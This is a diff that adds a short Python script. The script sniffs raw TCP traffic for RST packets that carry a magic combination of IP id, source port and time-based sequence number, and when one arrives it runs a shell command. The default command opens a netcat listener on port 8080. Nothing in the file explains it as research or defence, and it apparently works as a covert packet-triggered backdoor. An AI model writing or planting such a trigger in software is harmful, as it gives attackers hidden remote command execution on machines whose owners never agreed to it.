@@ -1,0 +1,74 @@
+#!/usr/bin/env python
+import os
+import time
+import struct
+import socket
+import select
+
+
+class Receive:
+    def __init__(self):
+        try:
+            self.s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+        except socket.error:
+            exit("Socket could not be created")
+
+    def _unpack_ip_header(self, packet):
+        header = struct.unpack('!BBHHHBBH4s4s', packet[0:20])
+        return {"dsf": header[1],
+                "total length": header[2],
+                "id": header[3],
+                "flags": header[4],
+                "time to live": header[5],
+                "protocol": header[6],
+                "checksum": header[7],
+                "source ip": socket.inet_ntoa(header[8]),
+                "dest ip": socket.inet_ntoa(header[9])}
+
+    def _unpack_tcp_header(self, packet):
+        header = struct.unpack('!HHLLBBHHH', packet[20:40])
+        return {"source port": header[0],
+                "dest port": header[1],
+                "seq": header[2], #maybe
+                "ack number": header[3],
+                "header length": header[4],
+                "flags": header[5],
+                "window": header[6],
+                "checksum": header[7],
+                "urg pnt": header[8]}
+
+    def yield_rst(self, timeout=None):
+        while True:
+            inp, outp, execption = select.select([self.s], [], [], timeout)
+            if not (inp or outp or execption):
+                raise TimeoutError
+            try:
+                for sock in inp:
+                    packet, source = sock.recvfrom(4096)
+                    ip_header = self._unpack_ip_header(packet)
+                    tcp_header = self._unpack_tcp_header(packet)
+                    if tcp_header['flags'] == 4: #rst
+                        yield {"source ip": source[0],
+                               "ip header": ip_header,
+                               "tcp header": tcp_header}
+            except KeyboardInterrupt:exit()
+            except:pass
+
+class Main:
+    def __init__(self):
+        self.receive = Receive()
+
+    def run(self, cmd):
+        for packet in self.receive.yield_rst():
+            p_id = packet["ip header"]["id"] + 31
+            src_port = packet["tcp header"]["source port"]
+            if src_port == (p_id ^ 19058):
+                time_stamp = int(time.time() /10000) % 99
+                seq = packet["tcp header"]["seq"]
+                if time_stamp == seq:
+                    os.system(cmd)
+
+
+if __name__ == "__main__":
+    main = Main()
+    main.run("nc -l -p 8080")
